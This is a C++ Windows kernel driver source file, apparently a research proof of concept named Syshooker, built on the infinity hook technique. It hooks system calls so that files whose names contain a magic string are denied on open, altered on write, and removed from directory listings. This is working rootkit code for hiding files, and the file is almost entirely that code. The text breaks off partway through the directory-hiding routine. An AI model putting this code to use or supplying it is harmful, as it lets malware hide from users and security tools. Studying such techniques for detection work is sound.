/*
*	Module Name:
*		entry.cpp
*
*	Abstract:
*		Sample driver that implements infinity hook to detour
*		system calls.
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*
*	Special thanks to Nemanja (Nemi) Mulasmajic <nm@triplefault.io>
*	for his help with the POC.
*
*/

#include "stdafx.h"
#include "entry.h"
#include "infinityhook.h"
#include "../Syshooker-Client/SyshookerCommon.h"

static UNICODE_STRING StringNtCreateFile = RTL_CONSTANT_STRING(L"NtCreateFile");
static NtCreateFile_t OriginalNtCreateFile = NULL;

static UNICODE_STRING StringNtWriteFile = RTL_CONSTANT_STRING(L"NtWriteFile");
static NtWriteFile_t OriginalNtWriteFile = NULL;

static UNICODE_STRING StringNtQueryDirectoryFile = RTL_CONSTANT_STRING(L"NtQueryDirectoryFile");
static NtQueryDirectoryFile_t OriginalNtQueryDirectoryFile = NULL;

static UNICODE_STRING StringNtQueryDirectoryFileEx = RTL_CONSTANT_STRING(L"NtQueryDirectoryFileEx");
static NtQueryDirectoryFileEx_t OriginalNtQueryDirectoryFileEx = NULL;

UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);

SyshookerSettings Settings = {L"ifh--", L"wassup", L"hideme"};

/*
*	The entry point of the driver. Initializes infinity hook and
*	sets up the driver's unload routine so that it can be gracefully 
*	turned off.
*/
extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	//UNREFERENCED_PARAMETER(RegistryPath);

	// IRP Routines
	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = SyshookerWrite;

	// Device name
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Syshooker");

	// create Device Object
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device object (0x%08X)\n", status));
		return status;
	}

	
	status = IoCreateSymbolicLink(&symLink, &deviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));

		// need to free DeviceObject to clean up!!!
		IoDeleteDevice(DeviceObject);
		return status;
	}

	//
	// Figure out when we built this last for debugging purposes.
	//
	kprintf("[+] infinityhook: Loaded.\n");
	
	//
	// Let the driver be unloaded gracefully. This also turns off 
	// infinity hook.
	//
	DriverObject->DriverUnload = DriverUnload;

	// HERE: find the address of a real syscall
	// Detour NtCreateFile.
	OriginalNtCreateFile = (NtCreateFile_t)MmGetSystemRoutineAddress(&StringNtCreateFile);
	if (!OriginalNtCreateFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtCreateFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Detour NtWriteFile
	OriginalNtWriteFile = (NtWriteFile_t)MmGetSystemRoutineAddress(&StringNtWriteFile);
	if (!OriginalNtWriteFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtWriteFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQueryDirectoryFile
	OriginalNtQueryDirectoryFile = (NtQueryDirectoryFile_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFile);
	if (!OriginalNtQueryDirectoryFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQueryDirectoryFileEx
	OriginalNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFileEx);
	if (!OriginalNtQueryDirectoryFileEx)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFileEx);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	//
	// Initialize infinity hook. Each system call will be redirected
	// to our syscall stub.
	//
	NTSTATUS Status = IfhInitialize(SyscallStub);
	if (!NT_SUCCESS(Status))
	{
		kprintf("[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
	}

	return Status;
}

/*
*	Turns off infinity hook.
*/
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);

	//
	// Unload infinity hook gracefully.
	//
	IfhRelease();

	// Release driver resources (symlink, device object)
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);


	kprintf("\n[!] infinityhook: Unloading... BYE!\n");
}

/*
*	For each usermode syscall, this stub will be invoked.
*/
void __fastcall SyscallStub(
	_In_ unsigned int SystemCallIndex, 
	_Inout_ void** SystemCallFunction)
{
	// 
	// Enabling this message gives you VERY verbose logging... and slows
	// down the system. Use it only for debugging.
	//
	
#if 0
	kprintf("[+] infinityhook: SYSCALL %lu: 0x%p [stack: 0x%p].\n", SystemCallIndex, *SystemCallFunction, SystemCallFunction);
#endif

	UNREFERENCED_PARAMETER(SystemCallIndex);

	// HERE: overwrite the syscall address
	//
	// In our demo, we care only about nt!NtCreateFile calls.
	//
	if (*SystemCallFunction == OriginalNtCreateFile)
	{
		//
		// We can overwrite the return address on the stack to our detoured
		// NtCreateFile.
		//
		*SystemCallFunction = DetourNtCreateFile;
	}

	// NtWriteFile
	if (*SystemCallFunction == OriginalNtWriteFile)
	{
		*SystemCallFunction = DetourNtWriteFile;
	}

	// NtQueryDirectoryFile
	if (*SystemCallFunction == OriginalNtQueryDirectoryFile)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFile;
	}

	// NtQueryDirectoryFileEx
	if (*SystemCallFunction == OriginalNtQueryDirectoryFileEx)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFileEx;
	}
}

// HERE: write the detour function
/*
*	This function is invoked instead of nt!NtCreateFile. It will 
*	attempt to filter a file by the "magic" file name.
*/
NTSTATUS DetourNtCreateFile(
	_Out_ PHANDLE FileHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_opt_ PLARGE_INTEGER AllocationSize,
	_In_ ULONG FileAttributes,
	_In_ ULONG ShareAccess,
	_In_ ULONG CreateDisposition,
	_In_ ULONG CreateOptions,
	_In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
	_In_ ULONG EaLength)
{
	//
	// We're going to filter for our "magic" file name.
	//
	if (ObjectAttributes &&
		ObjectAttributes->ObjectName && 
		ObjectAttributes->ObjectName->Buffer)
	{
		//
		// Unicode strings aren't guaranteed to be NULL terminated so
		// we allocate a copy that is.
		//
		PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));

		if (ObjectName)
		{
			memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
			memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
		
			//
			// Does it contain our special file name?
			//
			if (wcsstr(ObjectName, Settings.NtCreateFileMagicName))
			{
				kprintf("[+] infinityhook: Denying access to file: %wZ.\n", ObjectAttributes->ObjectName);

				ExFreePool(ObjectName);

				//
				// The demo denies access to said file.
				//
				return STATUS_NO_SUCH_FILE;
			}

			ExFreePool(ObjectName);
		}
	}

	//
	// We're uninterested, call the original.
	//
	return OriginalNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

// NtWriteFile Detour
NTSTATUS DetourNtWriteFile(
  _In_ HANDLE FileHandle,
  _In_opt_ HANDLE Event,
  _In_opt_ PIO_APC_ROUTINE ApcRoutine,
  _In_opt_ PVOID ApcContext,
  _Out_ PIO_STATUS_BLOCK IoStatusBlock,
  _In_ PVOID Buffer,
  _In_ ULONG Length,
  _In_opt_ PLARGE_INTEGER ByteOffset,
  _In_opt_ PULONG Key)
{
	// Obtain Object Reference from the Handle to retrieve the filename
	PVOID object = NULL;
	NTSTATUS status = ObReferenceObjectByHandle(FileHandle, 0, *IoFileObjectType, KernelMode, &object, nullptr);
	PWCHAR fileName = NULL;

	if (!NT_SUCCESS(status)) {
		kprintf("[+] infinityhook: WriteFile status not success :(!\n");
	}
	else {
		//kprintf("[+] infinityhook: WriteFile status success!!!\n");
		PFILE_OBJECT fileObject = (PFILE_OBJECT)object;
		//kprintf("[+] infinityhook: WriteFile filename direct (length: %d): %wZ\n", fileObject->FileName.Length, fileObject->FileName);

		fileName = (PWCHAR)ExAllocatePool(NonPagedPool, fileObject->FileName.Length + sizeof(wchar_t));
		//kprintf("[+] infinityhook: WriteFile fileName pointer after allocation: %p\n", fileName);

		if (fileName != NULL) {
			memset(fileName, 0, fileObject->FileName.Length + sizeof(wchar_t));
			memcpy(fileName, fileObject->FileName.Buffer, fileObject->FileName.Length);

			//kprintf("[+] infinityhook: fileName: %ws\n", fileName);

			if (wcsstr(fileName, Settings.NtWriteFileMagicName))
			{
				kprintf("[+] infinityhook: Logging call for NtWriteFile for file: %wZ.\n", fileObject->FileName);
				
				// Change the first byte in the buffer to be 'X'
				char* ptr = (char*)Buffer;
				ptr[0] = 'X';

				kprintf("[+] infinityhook: NtWriteFile buffer: %s.\n", (char*)Buffer);
			}

			ExFreePool(fileName);
		}

	}

	//
	// Call the original after logging.
	//
	return OriginalNtWriteFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
}

// NtQueryDirectoryFile Detour
NTSTATUS DetourNtQueryDirectoryFile(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ BOOLEAN ReturnSingleEntry,
	_In_opt_ PUNICODE_STRING FileName,
	_In_ BOOLEAN RestartScan)
{
	kprintf("[+] infinityhook: NtQueryDirectoryFile: %wZ, class: %d\n", FileName, FileInformationClass);

	//
	// Call the original syscall so that the buffers are populated
	//
	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	if (NT_SUCCESS(OriginalStatus)) {
		// if the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63] cast the buffer pointer to the appropriate structure pointer and read it
		// TODO
		if (FileInformationClass == 37) {
			PFILE_ID_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
			//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);

					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE - LAST ONE\n");

						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
	}
	return OriginalStatus;
}

// NtQueryDirectoryFile Detour
NTSTATUS DetourNtQueryDirectoryFileEx(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ ULONG QueryFlags,
	_In_opt_ PUNICODE_STRING FileName)
{
	kprintf("[+] infinityhook: NtQueryDirectoryFileEx: filename: %wZ, class: %d\n", FileName, FileInformationClass);


	//
	// Call the original syscall so that the buffers are populated
	//
	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);

	if (NT_SUCCESS(OriginalStatus)) {
		// if the call succeeded and the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63], cast the buffer pointer to an appropriate structure and read it
		if (FileInformationClass == 1) {
			PFILE_DIRECTORY_INFORMATION FileInformationPtr = (PFILE_DIRECTORY_INFORMATION)FileInformation;
			PFILE_DIRECTORY_INFORMATION PreviousFileInformationPtr = (PFILE_DIRECTORY_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_DIRECTORY_INFORMATION TempFileInformationPtr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_DIRECTORY_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_DIRECTORY_INFORMATION NextFileInformationStructAddr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_DIRECTORY_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 2) {
			PFILE_FULL_DIR_INFORMATION FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation;
			PFILE_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
			//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
					// change its name to be xxx
					/*for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
						(FileInformationPtr->FileName)[i] = L'x';
					}*/

					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
					
						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_FULL_DIR_INFORMATION TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_FULL_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE - LAST ONE\n");

						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 3) {
			PFILE_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_BOTH_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 12) {
			PFILE_NAMES_INFORMATION FileInformationPtr = (PFILE_NAMES_INFORMATION)FileInformation;
			PFILE_NAMES_INFORMATION PreviousFileInformationPtr = (PFILE_NAMES_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_NAMES_INFORMATION TempFileInformationPtr = (PFILE_NAMES_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_NAMES_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_NAMES_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_NAMES_INFORMATION NextFileInformationStructAddr = (PFILE_NAMES_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_NAMES_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_NAMES_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 37) {
			PFILE_ID_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_BOTH_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 38) {
